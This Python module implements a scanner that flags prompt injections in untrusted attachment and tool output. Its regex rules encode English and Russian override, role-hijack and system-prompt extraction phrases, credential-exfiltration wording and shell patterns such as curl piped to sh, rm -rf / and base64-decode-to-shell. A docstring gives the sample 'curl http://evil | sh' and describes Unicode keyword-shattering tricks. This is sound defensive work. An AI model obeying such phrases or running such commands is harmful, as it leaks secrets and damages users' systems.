# src/palatium_ai/core/security/prompt_injection.py

r"""Deterministic scanner for untrusted text that may carry prompt injections (020).

Attachments, MCP output and any external text are a low-trust source: instructions
inside them must never be treated as commands (OWASP LLM01). The scanner is a
*signal* consumed by ``UntrustedContentPolicy`` — it is not the only defence, so
fencing via ``wrap_untrusted_tool_output`` stays mandatory for every payload.

Matching never runs on the raw text. Four views are derived from it, because an
attacker controls the bytes and every extra view closes a bypass:

1. **folded** — invisible formatting removed (Unicode ``Default_Ignorable_Code_Point``
   minus the bidi controls), whitespace runs collapsed to one space, per-character
   NFKC. Removes ``ig\\u00adnore``-style keyword shattering.
2. **elastic** — the same folded view matched with patterns that allow whitespace
   inside their literal runs, so ``cur\\nl http://evil | sh`` and
   ``prev\\nious`` are still seen as one token. A whitespace-free view cannot do
   this: deleting the space also deletes the word boundary the pattern anchors on.
3. **de-accented** — folded with combining marks dropped, matched additively when
   (and only when) it differs from the folded view. Removes ``igno\\u0301re`` /
   ``ìgnore``. It cannot be the only view: stripping marks would also turn
   Cyrillic ``й`` into ``и`` and break the Russian patterns.
4. **raw** — original text, used only for position rules that would be destroyed by
   folding: bidi controls and invisible characters embedded inside a token.

Findings always carry spans in *original* coordinates, so ``redact_findings`` never
rewrites a document beyond the matched spans (``№42`` stays ``№42``).

Known non-goal for this wave: cross-script homoglyphs (Cyrillic ``і`` standing in
for Latin ``i``) are not folded, because that needs an explicit confusable table;
base64 payload decoding is a service-level concern (scan decoded blobs), not a
scanner concern.
"""

from __future__ import annotations

import re
import unicodedata

from collections.abc import Iterable
from typing import Literal, NamedTuple

from pydantic import BaseModel, Field

InjectionSeverity = Literal["none", "low", "medium", "high", "critical"]

# Explicit ranking — a bare ``max()`` over these strings ranks "none" highest
# ("low" > "critical" alphabetically) and would silently let injections through.
_SEVERITY_RANK: dict[InjectionSeverity, int] = {
    "none": 0,
    "low": 1,
    "medium": 2,
    "high": 3,
    "critical": 4,
}

_MAX_FINDINGS = 200
_MAX_OBFUSCATION_FINDINGS = 50
_EXCERPT_CHARS = 160

# Unicode Default_Ignorable_Code_Point, minus the bidi controls (those are
# handled as their own signal, not silently deleted — see _detect_bidi_controls).
# A hand-picked list of a few invisible characters is not enough: a single soft
# hyphen inside a keyword would defeat every pattern below.
_INVISIBLE_RANGES: tuple[tuple[int, int], ...] = (
    (0x00AD, 0x00AD),  # soft hyphen
    (0x034F, 0x034F),  # combining grapheme joiner
    (0x115F, 0x1160),  # hangul choseong/jungseong filler
    (0x17B4, 0x17B5),  # khmer inherent vowels
    (0x180B, 0x180F),  # mongolian free variation selectors
    (0x200B, 0x200D),  # zero-width space / non-joiner / joiner
    (0x2060, 0x2065),  # word joiner, invisible operators
    (0x206A, 0x206F),  # deprecated format characters
    (0x3164, 0x3164),  # hangul filler
    (0xFE00, 0xFE0F),  # variation selectors
    (0xFEFF, 0xFEFF),  # zero-width no-break space / BOM
    (0xFFA0, 0xFFA0),  # halfwidth hangul filler
    (0xFFF0, 0xFFF8),  # reserved format characters
    (0x1BCA0, 0x1BCA3),  # shorthand format controls
    (0x1D173, 0x1D17A),  # musical symbol format controls
    (0xE0000, 0xE0FFF),  # tags and variation selectors supplement
)

# Explicit embedding/override characters are never legitimate inside extracted
# document text: any occurrence is a deliberate attempt to reorder or hide text.
_BIDI_OVERRIDE_RANGES: tuple[tuple[int, int], ...] = (
    (0x202A, 0x202E),  # LRE/RLE/PDF/LRO/RLO
    (0x2066, 0x2069),  # LRI/RLI/FSI/PDI
)

# Direction marks do appear in legitimate RTL documents, so they stay a weaker
# signal — but they are still masked and never silently dropped.
_BIDI_MARK_CODEPOINTS = frozenset({0x061C, 0x200E, 0x200F})  # ALM, LRM, RLM


class _Rule(NamedTuple):
    """One detection rule: stable id (audit label), severity, source, elasticity.

    Storing the *source* rather than a compiled pattern lets the same rule be
    compiled twice: as written for the folded view, and space-elastic for the
    whitespace-free compact view.
    """

    rule: str
    severity: InjectionSeverity
    source: str
    elastic: bool = False


# English and Russian variants are separate rules on purpose: the corpus is
# mostly Russian, and distinct rule ids keep audit entries readable.
_RULE_SPECS: tuple[_Rule, ...] = (
    _Rule(
        "instruction_override",
        "critical",
        r"\bignore\s+(?:all\s+|any\s+|the\s+)*"
        r"(?:previous|prior|above|earlier|preceding|foregoing)\s+"
        r"(?:instruction|prompt|rule|direction|command)s?\b",
        elastic=True,
    ),
    _Rule(
        "instruction_override_ru",
        "critical",
        r"\bигнорируй(?:те)?\s+(?:все\s+|любые\s+)?"
        r"(?:предыдущ\w*|прежн\w*|выше\w*|ранее\s+данн\w*)\s+"
        r"(?:инструкц\w*|указани\w*|правил\w*|команд\w*)",
        elastic=True,
    ),
    _Rule(
        "instruction_override_ru_verb",
        "high",
        r"\b(?:не\s+выполняй|отмени|забудь|проигнорируй)\w*\s+"
        r"(?:предыдущ\w*|прежн\w*|полученн\w*|все\s+)\s*"
        r"(?:инструкц\w*|указани\w*|правил\w*|команд\w*)?",
        elastic=True,
    ),
    _Rule(
        "system_prompt_exfiltration",
        "high",
        r"\b(?:reveal|print|repeat|show|dump|output|display|leak)\b"
        r"[^.\n]{0,40}\b(?:system|developer|hidden|initial|secret)\s+"
        r"(?:prompt|message|instruction)s?\b",
        elastic=True,
    ),
    _Rule(
        "system_prompt_exfiltration_ru",
        "high",
        r"\b(?:покажи|выведи|напечатай|повтори|раскрой|перечисли)\w*"
        r"[^.\n]{0,40}(?:системн\w+\s+(?:промпт\w*|сообщени\w*|инструкц\w*)|"
        r"исходн\w+\s+промпт\w*|скрыт\w+\s+инструкц\w*)",
        elastic=True,
    ),
    _Rule(
        "role_hijack",
        "high",
        r"\b(?:you\s+are\s+now|from\s+now\s+on\s+you(?:'re| are)?|"
        r"act\s+as\s+(?:a|an|the)\s+(?:system|developer|admin|root|unrestricted))\b",
        elastic=True,
    ),
    _Rule(
        "role_hijack_ru",
        "high",
        r"\b(?:теперь\s+ты|с\s+этого\s+момента\s+ты|действуй\s+как|"
        r"представь,\s*что\s+ты)\s+(?:систем\w*|разработчик\w*|админ\w*|root\b)",
        elastic=True,
    ),
    _Rule(
        "fence_breakout",
        "critical",
        r"<<<\s*(?:END_)?UNTRUSTED_TOOL_OUTPUT\s*>>>",
        elastic=True,
    ),
    _Rule(
        "credential_exfiltration",
        "critical",
        r"\b(?:send|post|upload|exfiltrate|forward|transmit|email)\b"
        r"[^.\n]{0,60}\b(?:api[_\s-]?keys?|tokens?|passwords?|credentials?|secrets?|"
        r"private\s+keys?)\b",
        elastic=True,
    ),
    _Rule(
        "credential_exfiltration_ru",
        "critical",
        # Object side must stay credential-shaped. ``секрет\w*`` falsely matched
        # classification stamps (секретно/секретный) and office roles (секретарь)
        # that dominate scanned corporate PDFs — noun forms of «секрет» only.
        r"\b(?:отправ\w*|переда\w*|перешл\w*|загруз\w*|выгруз\w*|пошли)\b"
        r"[^.\n]{0,60}\b(?:парол\w*|токен\w*|api[_\s-]?ключ\w*|"
        r"секрет(?:а|у|ом|е|ы|ов|ам|ами|ах)?\b|"
        r"приватн\w*\s+ключ\w*|учётн\w*\s+данн\w*|учетн\w*\s+данн\w*)",
        elastic=True,
    ),
    _Rule(
        "shell_execution",
        "critical",
        r"(?:\b(?:curl|wget)\b[^\n|]{0,80}\|\s*(?:ba|z|k|da)?sh\b"
        r"|\brm\s+-rf\s+/|\bbase64\s+(?:-d|--decode)\b[^\n|]{0,40}\|\s*(?:ba|z)?sh\b)",
        # A page break inside a command (``cur\nl http://evil | sh``) is the same
        # class of shatter as inside a phrase, so this rule needs the elastic pass.
        elastic=True,
    ),
    _Rule(
        "tool_directive",
        "medium",
        r"\b(?:call|invoke|execute|run|вызови|выполни)\w*\s+"
        r"(?:(?:the\s+)?(?:tool|function)\s+|mcp[_\s-]?(?:tool|server)\s+|"
        r"инструмент\w*\s+|функци\w+\s+)"
        r"[a-z_][a-z0-9_]{2,}",
        elastic=True,
    ),
    # Anchoring to a line start is impossible on folded text (page markers and
    # newlines are collapsed), so this leans on the role/colon/directive shape.
    _Rule(
        "chat_role_marker",
        "medium",
        r"\b(?:system|assistant|developer)\s*:\s*(?:you|ignore|always|never|do\s+not)\b",
        elastic=True,
    ),
    # Explicit overrides quarantine: stripping the single control character would
    # deliver the reordered instruction intact, so masking is not a safe action.
    _Rule(
        "bidi_override",
        "high",
        r"[\u202a-\u202e\u2066-\u2069]",
    ),
    _Rule(
        "bidi_mark",
        "medium",
        r"[\u061c\u200e\u200f]",
    ),
    _Rule(
        "role_marker_inline",
        "low",
        r"\b(?:system\s+prompt|системн\w+\s+промпт)\b",
        elastic=True,
    ),
)


def _compile(source: str) -> re.Pattern[str]:
    return re.compile(source, re.IGNORECASE)


# Regex syntax that must be copied verbatim by :func:`_space_elastic`: escape
# sequences, character classes and explicit quantifiers.
_VERBATIM_TOKEN = re.compile(r"\\[\s\S]|\[[^\]]*\]|\{\d*,?\d*\}")
#: A literal word run — the only place optional whitespace may be interleaved.
_LITERAL_RUN = re.compile(r"\w+")


def _elastic_run(chunk: str) -> str:
    """Interleave an optional whitespace between the letters of each literal run."""
    return _LITERAL_RUN.sub(lambda match: r"\s*".join(match.group(0)), chunk)


def _space_elastic(source: str) -> str:
    r"""Allow optional whitespace inside the literal runs of a pattern.

    Folding collapses a whitespace run to a single space, so a keyword shattered by
    a page break becomes ``prev ious``. Matching a whitespace-free view cannot
    recover it: dropping the space also drops the word boundary the pattern anchors
    on, so ``\bcurl\b`` never matches ``curlhttp://evil``. Interleaving an optional
    whitespace between the letters keeps both the letters and the anchors valid.
    """
    out: list[str] = []
    cursor = 0
    for token in _VERBATIM_TOKEN.finditer(source):
        out.append(_elastic_run(source[cursor : token.start()]))
        out.append(token.group(0))
        cursor = token.end()
    out.append(_elastic_run(source[cursor:]))
    return "".join(out)


# Elastic rules are matched a second time with whitespace allowed inside their
# literal runs, which closes newline/page-break shattering of a whole command or
# a single keyword without deleting the word boundaries.
_ELASTIC_FOLDED_RULES: tuple[_Rule, ...] = tuple(
    rule._replace(source=_space_elastic(rule.source.replace(r"\s+", r"\s*")), elastic=False)
    for rule in _RULE_SPECS
    if rule.elastic
)

_RULES: tuple[tuple[_Rule, re.Pattern[str]], ...] = tuple((rule, _compile(rule.source)) for rule in _RULE_SPECS)

_ELASTIC_RULES: tuple[tuple[_Rule, re.Pattern[str]], ...] = tuple(
    (rule, _compile(rule.source)) for rule in _ELASTIC_FOLDED_RULES
)


class InjectionFinding(BaseModel):
    """A single matched span, addressed in the *original* text coordinates."""

    model_config = {"frozen": True}

    rule: str = Field(min_length=1, max_length=64)
    severity: InjectionSeverity
    excerpt: str = Field(max_length=_EXCERPT_CHARS)
    start: int = Field(ge=0)
    end: int = Field(ge=0)


class PromptInjectionReport(BaseModel):
    """Scan result for one untrusted payload.

    ``truncated`` means finding caps were hit, so the report is provably
    incomplete and the consumer must fail closed (020) rather than treat a
    partially redacted payload as safe.
    """

    model_config = {"frozen": True}

    findings: tuple[InjectionFinding, ...] = ()
    scanned_chars: int = Field(ge=0)
    truncated: bool = False

    @property
    def worst_severity(self) -> InjectionSeverity:
        """Highest severity present, ranked explicitly (never lexicographically)."""
        return worst_severity(self.findings)

    @property
    def is_clean(self) -> bool:
        """True only when nothing matched *and* the scan ran to completion.

        A truncated report proves the scan stopped at the finding cap, so the tail
        was never inspected — reporting it as clean would hand an unscanned
        payload to a caller that skips :class:`UntrustedContentPolicy` (020).
        """
        return not self.findings and not self.truncated


def severity_rank(severity: InjectionSeverity) -> int:
    """Numeric rank for a severity; the only ordering authority in the codebase."""
    return _SEVERITY_RANK[severity]


def worst_severity(findings: Iterable[InjectionFinding]) -> InjectionSeverity:
    """Return the most severe finding's severity, or ``"none"`` when empty."""
    worst: InjectionSeverity = "none"
    worst_rank = _SEVERITY_RANK["none"]
    for finding in findings:
        rank = _SEVERITY_RANK[finding.severity]
        if rank > worst_rank:
            worst = finding.severity
            worst_rank = rank
    return worst


def fold_for_scan(text: str) -> str:
    """Return the folded matching view (invisibles dropped, whitespace collapsed)."""
    return _fold_with_map(text)[0]


def scan_prompt_injection(text: str) -> PromptInjectionReport:
    """Scan untrusted text; findings carry spans in the original text."""
    folded, starts, ends = _fold_with_map(text)

    findings: list[InjectionFinding] = []
    truncated = False
    for patterns in (_RULES, _ELASTIC_RULES):
        truncated = _collect(findings, patterns, folded, starts, ends) or truncated

    # Accent / combining-mark shattering (``igno\u0301re``, ``ìgnore``). Stripping
    # marks cannot be the *only* view — it would also turn Cyrillic ``й`` into
    # ``и`` and break the Russian patterns — so it is an additive extra pass, run
    # only when the view actually differs so ordinary text yields no duplicates.
    plain, plain_starts, plain_ends = _deaccent_with_map(folded, starts, ends)
    if plain != folded:
        truncated = _collect(findings, _RULES, plain, plain_starts, plain_ends) or truncated

    # Position rules read the original text: folding would erase their evidence.
    for detector in (_detect_bidi_controls, _detect_invisible_obfuscation):
        detected = detector(text)
        if len(detected) >= _MAX_OBFUSCATION_FINDINGS:
            # The detector stopped at its own cap, so findings are missing.
            truncated = True
        findings.extend(detected)

    if len(findings) >= _MAX_FINDINGS:
        truncated = True

    return PromptInjectionReport(
        findings=tuple(findings[:_MAX_FINDINGS]),
        scanned_chars=len(text),
        truncated=truncated,
    )


def _collect(
    findings: list[InjectionFinding],
    patterns: tuple[tuple[_Rule, re.Pattern[str]], ...],
    view: str,
    starts: tuple[int, ...],
    ends: tuple[int, ...],
) -> bool:
    """Match one pattern set into ``findings``; True when the finding cap was hit."""
    for rule, pattern in patterns:
        if len(findings) >= _MAX_FINDINGS:
            return True
        findings.extend(_match(rule, pattern, view, starts, ends, remaining=_MAX_FINDINGS - len(findings)))
    return False


def redact_findings(text: str, findings: Iterable[InjectionFinding]) -> str:
    """Replace matched spans with ``[redacted:<rule>]``; overlaps are merged.

    Operates on the original text, so untouched characters (including zero-width
    ones and compatibility forms such as ``№``) survive verbatim.
    """
    spans = _merge_spans(findings)
    if not spans:
        return text
    parts: list[str] = []
    cursor = 0
    for start, end, rule in spans:
        if start >= len(text) or end <= cursor:
            continue
        parts.append(text[cursor:start])
        parts.append(f"[redacted:{rule}]")
        cursor = end
    parts.append(text[cursor:])
    return "".join(parts)


def _match(
    rule: _Rule,
    pattern: re.Pattern[str],
    view: str,
    starts: tuple[int, ...],
    ends: tuple[int, ...],
    *,
    remaining: int,
) -> list[InjectionFinding]:
    """Match one rule against one view, mapping spans back to original offsets."""
    if remaining <= 0:
        return []
    found: list[InjectionFinding] = []
    for match in pattern.finditer(view):
        if len(found) >= remaining:
            break
        start_index = match.start()
        end_index = match.end() - 1
        if start_index >= len(starts) or end_index >= len(ends) or end_index < start_index:
            continue
        found.append(
            InjectionFinding(
                rule=rule.rule,
                severity=rule.severity,
                excerpt=match.group(0)[:_EXCERPT_CHARS],
                start=starts[start_index],
                end=ends[end_index],
            )
        )
    return found


def _detect_bidi_controls(text: str) -> list[InjectionFinding]:
    """Flag bidi controls in the raw text, most severe class first."""
    findings: list[InjectionFinding] = []
    for index, char in enumerate(text):
        codepoint = ord(char)
        severity = _bidi_severity(codepoint)
        if severity is None:
            continue
        findings.append(
            InjectionFinding(
                rule="bidi_override" if severity == "high" else "bidi_mark",
                severity=severity,
                excerpt=char,
                start=index,
                end=index + 1,
            )
        )
        if len(findings) >= _MAX_OBFUSCATION_FINDINGS:
            break
    return findings


def _bidi_severity(codepoint: int) -> InjectionSeverity | None:
    if codepoint in _BIDI_MARK_CODEPOINTS:
        return "medium"
    if any(low <= codepoint <= high for low, high in _BIDI_OVERRIDE_RANGES):
        return "high"
    return None


def _detect_invisible_obfuscation(text: str) -> list[InjectionFinding]:
    """Flag invisible characters embedded *inside* a token.

    Such a character has no legitimate purpose mid-word: it exists to shatter a
    keyword that would otherwise match. Folding already neutralises the shatter,
    and this signal keeps the attempt visible in audit.
    """
    findings: list[InjectionFinding] = []
    for index, char in enumerate(text):
        if not _is_invisible(char):
            continue
        before = text[index - 1] if index > 0 else ""
        after = text[index + 1] if index + 1 < len(text) else ""
        if not _is_token_char(before) or not _is_token_char(after):
            continue
        findings.append(
            InjectionFinding(
                rule="invisible_obfuscation",
                severity="medium",
                excerpt=f"U+{ord(char):04X}",
                start=index,
                end=index + 1,
            )
        )
        if len(findings) >= _MAX_OBFUSCATION_FINDINGS:
            break
    return findings


def _is_token_char(char: str) -> bool:
    return bool(char) and not char.isspace() and _bidi_severity(ord(char)) is None


def _is_invisible(char: str) -> bool:
    codepoint = ord(char)
    return any(low <= codepoint <= high for low, high in _INVISIBLE_RANGES)


def _compose_with_map(text: str) -> tuple[str, tuple[int, ...], tuple[int, ...]]:
    """NFKC-normalize ``text`` and return per-character original start/end offsets.

    Normalization has to run on the *whole* string, not per character: a
    combining sequence is composed of several code points, so per-character NFKC
    leaves ``и`` + U+0306 as two characters instead of ``й``. Text produced by
    macOS is canonically decomposed (NFD) as a rule, so a Russian keyword would be
    invisible to every pattern. The expansion case (``№`` → ``No``) maps both
    output characters back onto the single original character, so redaction still
    removes exactly the source span.
    """
    composed: list[str] = []
    starts: list[int] = []
    ends: list[int] = []
    index = 0
    length = len(text)
    while index < length:
        stop = index + 1
        while stop < length and len(unicodedata.normalize("NFKC", text[index : stop + 1])) == 1:
            stop += 1
        for char in unicodedata.normalize("NFKC", text[index:stop]):
            composed.append(char)
            starts.append(index)
            ends.append(stop)
        index = stop
    return "".join(composed), tuple(starts), tuple(ends)


def _fold_with_map(text: str) -> tuple[str, tuple[int, ...], tuple[int, ...]]:
    """Fold text and return per-folded-character start/end offsets in the original."""
    composed, comp_starts, comp_ends = _compose_with_map(text)
    folded: list[str] = []
    starts: list[int] = []
    ends: list[int] = []
    in_space_run = False
    for index, char in enumerate(composed):
        start = comp_starts[index]
        end = comp_ends[index]
        if _is_invisible(char) or _bidi_severity(ord(char)) is not None:
            # Dropped from the matching view so it cannot shatter a keyword.
            continue
        if char.isspace():
            if in_space_run:
                # A whitespace run collapses to one space covering the whole run,
                # so redaction of a span that includes it removes all of it.
                ends[-1] = end
                continue
            in_space_run = True
            folded.append(" ")
            starts.append(start)
            ends.append(end)
            continue
        in_space_run = False
        folded.append(char)
        starts.append(start)
        ends.append(end)
    return "".join(folded), tuple(starts), tuple(ends)


def _deaccent_with_map(
    folded: str,
    starts: tuple[int, ...],
    ends: tuple[int, ...],
) -> tuple[str, tuple[int, ...], tuple[int, ...]]:
    r"""Drop combining marks from an already-folded view, keeping original offsets.

    ``igno\\u0301re`` and ``ìgnore`` shatter a keyword that folding alone cannot
    repair: NFKC composes the mark into a precomposed letter, which is still not
    the ASCII letter the pattern expects. Decomposing and dropping the mark
    recovers it. Spans still map back to the original text, so the mark itself
    sits inside the redacted span.
    """
    plain: list[str] = []
    plain_starts: list[int] = []
    plain_ends: list[int] = []
    for index, char in enumerate(folded):
        for base in unicodedata.normalize("NFD", char):
            if unicodedata.category(base) in {"Mn", "Me", "Cf"}:
                continue
            plain.append(base)
            plain_starts.append(starts[index])
            plain_ends.append(ends[index])
    return "".join(plain), tuple(plain_starts), tuple(plain_ends)


def _merge_spans(findings: Iterable[InjectionFinding]) -> list[tuple[int, int, str]]:
    """Sort, drop empty spans, merge overlaps keeping the most severe rule id."""
    ordered = sorted(
        findings,
        key=lambda finding: (finding.start, -_SEVERITY_RANK[finding.severity], finding.end),
    )
    merged: list[tuple[int, int, str, int]] = []
    for finding in ordered:
        if finding.end <= finding.start:
            continue
        rank = _SEVERITY_RANK[finding.severity]
        if merged and finding.start <= merged[-1][1]:
            start, end, rule, rule_rank = merged[-1]
            keep_rule = finding.rule if rank > rule_rank else rule
            keep_rank = max(rank, rule_rank)
            merged[-1] = (start, max(end, finding.end), keep_rule, keep_rank)
            continue
        merged.append((finding.start, finding.end, finding.rule, rank))
    return [(start, end, rule) for start, end, rule, _rank in merged]
